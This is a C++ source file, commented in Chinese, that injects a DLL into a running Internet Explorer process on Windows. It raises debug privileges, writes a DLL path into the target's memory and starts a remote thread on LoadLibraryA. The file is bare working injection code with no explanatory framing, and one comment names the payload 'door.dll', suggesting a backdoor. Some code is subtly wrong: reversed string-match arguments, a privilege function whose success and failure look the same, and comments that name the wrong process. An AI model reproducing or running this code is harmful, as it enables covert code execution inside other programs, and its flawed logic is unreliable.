#include<windows.h>
#include <iostream>
#include<tlhelp32.h>
#include<stdio.h>
int EnableDebugPriv(const char * name)
{
	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES tp = {0};
	LUID luid;
	//打开进程令牌环
	if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
	{
		return FALSE;
	}
	//获得进程本地唯一的ID
	if(!LookupPrivilegeValue(NULL,name,&luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}
		tp.PrivilegeCount = 1;
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		tp.Privileges[0].Luid = luid;
	//调整权限
	if(!AdjustTokenPrivileges(hToken,0,&tp,sizeof(TOKEN_PRIVILEGES),NULL,NULL))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	return 0; 
}

BOOL InjectDll(const char *DllFullPath, const DWORD dwRemoteProcessId)
{
	HANDLE hRemoteProcess;
	EnableDebugPriv(SE_DEBUG_NAME);
	//打开远程线程
	hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwRemoteProcessId);
	char *pszLibFileRemote;
	//使用VirtualAllocEx函数在远程进程的内存地址空间分配DLL文件名空间 
	pszLibFileRemote = (char *) VirtualAllocEx( hRemoteProcess, NULL, lstrlen(DllFullPath)+1, MEM_COMMIT, PAGE_READWRITE);
	//使用WriteProcessMemory函数将DLL的路径名写入到远程进程的内存空间
	WriteProcessMemory(hRemoteProcess, pszLibFileRemote, (void *) DllFullPath, lstrlen(DllFullPath)+1, NULL);
	//计算LoadLibraryA 的入口地址
	PTHREAD_START_ROUTINE pfnStartAddr = (PTHREAD_START_ROUTINE) GetProcAddress(GetModuleHandle(TEXT("Kernel32.dll")), "LoadLibraryA");
	//启动远程线程LoadLibraryA, 通过远程线程调用创建新的线程
	HANDLE hRemoteThread;
	if((hRemoteThread = CreateRemoteThread(hRemoteProcess, NULL, 0, pfnStartAddr, pszLibFileRemote, 0, NULL)) == NULL)
	{
		printf("注入线程失败!");
		return FALSE;
	 } 
	 //释放句柄
	CloseHandle(hRemoteProcess);
	CloseHandle(hRemoteThread);
	return TRUE; 
}

DWORD GetProcessId()
{
	DWORD Pid = -1;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	//创建系统快照
	PROCESSENTRY32 lPrs;
	ZeroMemory(&lPrs, sizeof(lPrs));
	lPrs.dwSize = sizeof(lPrs);
	char *targetFile = "iexplore.exe";
	if(!Process32First(hSnap, &lPrs)) //取得系统快照中第一个进程信息 
	{
		printf("The frist entry of the process list has not been copyied to the buffer");
		return FALSE;
	}
    
	if(strstr(targetFile, lPrs.szExeFile))    //判断进程信息是否为 explorer.exe
	{
		Pid = lPrs.th32ProcessID;
		return Pid;
	}
	while(1)
	{
		ZeroMemory(&lPrs, sizeof(lPrs));
		lPrs.dwSize = (&lPrs, sizeof(lPrs));
		if(!Process32Next(hSnap, &lPrs))
		{
			Pid = -1;
			break;
		}
		if(strstr(targetFile, lPrs.szExeFile))
		{
			Pid = lPrs.th32ProcessID;
			break;
		}
	 } 
	 printf("%d",Pid);
	return Pid;
 } 
 
int main()
{
	char myFILE[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, myFILE);
	//取当前路径给myFILE
	strcat(myFILE, "\\DLL.dll");   //当前路径加door.dll 
	// printf("myFILE");
	//printf("GetProcessId()");
	InjectDll(myFILE, GetProcessId());
	//这个数字是想注入进程的ID号 
	return 0;
}









